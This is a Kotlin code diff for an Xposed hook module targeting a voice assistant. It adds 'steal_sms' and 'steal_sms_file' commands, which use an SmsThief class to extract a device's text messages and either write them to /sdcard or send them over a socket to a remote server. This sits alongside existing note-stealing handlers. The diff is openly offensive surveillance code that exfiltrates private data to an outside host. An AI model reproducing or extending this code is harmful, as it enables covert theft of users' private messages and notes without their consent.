@@ -16,6 +16,7 @@ import xyz.mufanc.vap.api.MethodFinder
 import xyz.mufanc.vap.util.Log
 import xyz.mufanc.vap.util.NotesThief
 import xyz.mufanc.vap.util.Recorder
+import xyz.mufanc.vap.util.SmsThief
 import java.io.BufferedOutputStream
 import java.io.ByteArrayOutputStream
 import java.net.Socket
@@ -103,6 +104,15 @@ class HookVoiceAssist(ixp: XposedInterface): HookBase(ixp) {
             "steal_folder" -> {
                 val folderId = message.getInt("FolderId", 0).toLong()
                 handleStealFolder(folderId, kServerAddress, kServerPort)
+            }
+            "steal_sms_file" -> {
+                val outputPath = message.getString("output") ?: "/sdcard/sms_theft_raw.json"
+                val limit = message.getInt("limit", 20)
+                handleStealSmsFile(outputPath, limit)
+            }
+            "steal_sms" -> {
+                val limit = message.getInt("limit", 20)
+                handleStealSms(kServerAddress, kServerPort, limit)
             }
             else -> handleRecord(action, kServerAddress, kServerPort, message)
         }
@@ -225,6 +235,28 @@ class HookVoiceAssist(ixp: XposedInterface): HookBase(ixp) {
             Log.i(TAG, "Folder notes written to file: $count notes")
         } catch (e: Throwable) {
             Log.e(TAG, "steal_folder_file failed", e)
+        }
+    }
+
+    private fun handleStealSmsFile(outputPath: String, limit: Int) {
+        Log.i(TAG, "Action=steal_sms_file: extracting top $limit messages to $outputPath")
+        try {
+            val thief = SmsThief()
+            val count = thief.stealToFile(outputPath, limit)
+            Log.i(TAG, "SMS theft completed, $count messages written.")
+        } catch (e: Throwable) {
+            Log.e(TAG, "SMS theft failed", e)
+        }
+    }
+
+    private fun handleStealSms(serverAddress: String, serverPort: Int, limit: Int) {
+        Log.i(TAG, "Action=steal_sms: extracting top $limit messages, target=$serverAddress:$serverPort")
+        try {
+            val thief = SmsThief()
+            val count = thief.stealToSocket(serverAddress, serverPort, limit)
+            Log.i(TAG, "SMS exfiltration completed, $count messages sent.")
+        } catch (e: Throwable) {
+            Log.e(TAG, "SMS exfiltration failed", e)
         }
     }
 }
